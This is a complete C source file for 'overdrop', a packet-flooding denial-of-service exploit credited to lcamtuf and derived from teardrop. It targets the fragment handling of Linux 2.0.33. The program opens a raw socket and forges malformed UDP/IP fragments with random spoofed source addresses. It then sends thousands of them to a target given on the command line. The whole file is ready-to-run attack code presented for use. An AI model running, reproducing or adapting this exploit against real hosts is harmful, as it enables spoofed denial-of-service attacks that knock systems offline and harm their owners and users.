// overdrop by lcamtuf [Linux 2.0.33 printk abuse]
// ------------------------------------------------
// based on (reaped from) teardrop by route|daemon9

    #include <stdio.h> 
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <netdb.h>
    #include <netinet/in.h>
    #include <netinet/udp.h>
    #include <arpa/inet.h>
    #include <sys/types.h>
    #include <sys/time.h>
    #include <sys/socket.h>

    #define IP_MF   0x2000
    #define IPH     0x14
    #define UDPH    0x8
    #define PADDING 0x1c
    #define MAGIC   0x3
    #define COUNT   0xBEEF
    #define FRAG2   0xFFFF

void usage(char *name) {
      fprintf(stderr,"%s dst_ip [ -n how_many ] [ -s src_ip ]\n",name);
      exit(0);
}

u_long name_resolve(char *host_name) {
      struct in_addr addr;
      struct hostent *host_ent;
      if ((addr.s_addr=inet_addr(host_name))==-1) {
        if (!(host_ent=gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr,(char *)&addr.s_addr,host_ent->h_length);
      }
      return (addr.s_addr);
}


void send_frags(int sock,u_long src_ip,u_long dst_ip,u_short src_prt,u_short dst_prt) {
      u_char *packet=NULL,*p_ptr=NULL;
      u_char byte;
      struct sockaddr_in sin;
      sin.sin_family=AF_INET;
      sin.sin_port=src_prt;
      sin.sin_addr.s_addr=dst_ip;
      packet=(u_char *)malloc(IPH+UDPH+PADDING);
      p_ptr=packet;
      bzero((u_char *)p_ptr,IPH+UDPH+PADDING);
      byte=0x45;
      memcpy(p_ptr,&byte,sizeof(u_char));
      p_ptr+=2;
      *((u_short *)p_ptr)=htons(IPH+UDPH+PADDING);
      p_ptr+=2;
      *((u_short *)p_ptr)=htons(242);
      p_ptr+=2;
      *((u_short *)p_ptr)|=htons(IP_MF);
      p_ptr+=2;
      *((u_short *)p_ptr)=0x40;
      byte=IPPROTO_UDP;
      memcpy(p_ptr+1,&byte,sizeof(u_char));
      p_ptr+=4;
      *((u_long *)p_ptr)=src_ip;
      p_ptr+=4;
      *((u_long *)p_ptr)=dst_ip;
      p_ptr+=4;
      *((u_short *)p_ptr)=htons(src_prt);
      p_ptr+=2;
      *((u_short *)p_ptr)=htons(dst_prt);
      p_ptr+=2;
      *((u_short *)p_ptr)=htons(8+PADDING);
      if (sendto(sock,packet,IPH+UDPH+PADDING,0,(struct sockaddr *)&sin,
		 sizeof(struct sockaddr))==-1) {
        perror("\nsendto");
        free(packet);
        exit(1);
      }
      p_ptr=&packet[2];
      *((u_short *)p_ptr)=htons(IPH+MAGIC+1);
      p_ptr+=4;
      *((u_short *)p_ptr)=htons(FRAG2);
      if (sendto(sock,packet,IPH+MAGIC+1,0,(struct sockaddr *)&sin,
		 sizeof(struct sockaddr))==-1) {
        perror("\nsendto");
        free(packet);
        exit(1);
      }
      free(packet);
}


int main(int argc, char **argv) {
      int one=1,count=0,i,rip_sock;
      u_long  src_ip=0,dst_ip=0;
      u_short src_prt=0,dst_prt=0;
      struct in_addr addr;
      fprintf(stderr,"overdrop by lcamtuf [based on teardrop by route|daemon9]\n\n");
      if((rip_sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) {
        perror("raw socket");
        exit(1);
      }
      if (setsockopt(rip_sock,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one))<0) {
        perror("IP_HDRINCL");
        exit(1);
      }
      if (argc < 2) usage(argv[0]);
      if (!(dst_ip=name_resolve(argv[1]))) {
        fprintf(stderr,"Can't resolve destination address.\n");
        exit(1);
      }
      while ((i=getopt(argc,argv,"s:n:"))!=EOF) {
        switch (i) {
	case 'n':
            count   = atoi(optarg);
            break;
	case 's':
	  if (!(src_ip=name_resolve(optarg))) {
              fprintf(stderr,"Can't resolve source address.\n");
              exit(1);
	  }
            break;
	default:
            usage(argv[0]);
            break;
        }
      }
      srandom((unsigned)(time((time_t)0)));
      if (!count) count=COUNT;
      fprintf(stderr,"Sending oversized packets:\nFrom: ");
      if (!src_ip) fprintf(stderr,"       (random)"); else {
        addr.s_addr = src_ip;
        fprintf(stderr,"%15s",inet_ntoa(addr));
      }
      addr.s_addr = dst_ip;
      fprintf(stderr,"\n  To: %15s\n",inet_ntoa(addr));
      fprintf(stderr," Amt: %5d\n",count);
      fprintf(stderr,"[ ");
      for (i=0;i<count;i++) {
        if (!src_ip) send_frags(rip_sock,rand(),dst_ip,rand(),rand()); else
          send_frags(rip_sock,src_ip,dst_ip,rand(),rand());
        fprintf(stderr, "b00z ");
        usleep(500);
      }
      fprintf(stderr, "]\n");
      return (0);
}